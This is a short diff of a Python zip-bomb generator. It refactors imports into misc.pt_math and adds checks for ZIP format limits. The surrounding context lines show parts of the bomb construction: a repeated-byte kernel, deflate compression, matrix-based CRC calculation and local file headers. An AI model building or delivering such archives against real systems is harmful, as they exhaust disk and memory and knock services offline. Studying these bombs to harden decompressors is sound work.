@@ -2,7 +2,7 @@ import io
 import zipfile
 import zlib
 import struct
-import pt_math
+import misc.pt_math
 
 #Basic Recusive zipbomb
 def write_base_dummy(size_MB):
@@ -192,9 +192,9 @@ def generate_unique_names(count):
 
 def calculate_curr_crc(prev_matrix,prev_lfh_bytes):
     """CRC32 claculation method using matrix optimalization"""
-    Mx = pt_math.build_data_matrix(prev_lfh_bytes)
-    M_file = pt_math.gf2_matmul(prev_matrix, Mx)
-    crc = pt_math.get_final_crc(M_file)
+    Mx = misc.pt_math.build_data_matrix(prev_lfh_bytes)
+    M_file = misc.pt_math.gf2_matmul(prev_matrix, Mx)
+    crc = misc.pt_math.get_final_crc(M_file)
     return crc,M_file
 
 
@@ -203,12 +203,17 @@ def build_flat_bomb(f_count,decomp_kernel_size_MB):
     binary_blocks = []
     cdh_metadata = []
 
+    if(f_count+1 > 0xFFFF): #standard zip specification limit of 65,535 files per archive
+        raise ValueError(f"Archive file count ({f_count}) exceeds 65,535 limit.")
+    if(decomp_kernel_size_MB*1024*1024 > 0xFFFFFFFF):
+        raise ValueError("Exceeded maximum treshold for uncompressed data at 4,294,967,295B")
+
     uniq_names = generate_unique_names(f_count)
 
     data = b"a"*1024*1024*decomp_kernel_size_MB
     raw_deflated = build_kernel(data)
-    kernel_matrix = pt_math.build_kernel_matrix(decomp_kernel_size_MB)
-    kernel_crc = pt_math.get_final_crc(kernel_matrix)
+    kernel_matrix = misc.pt_math.build_kernel_matrix(decomp_kernel_size_MB)
+    kernel_crc = misc.pt_math.get_final_crc(kernel_matrix)
 
     lfh_k_bytes = pack_local_file_header(b"THEKRNL", kernel_crc, len(raw_deflated), len(data))
     full_k_block = lfh_k_bytes + raw_deflated
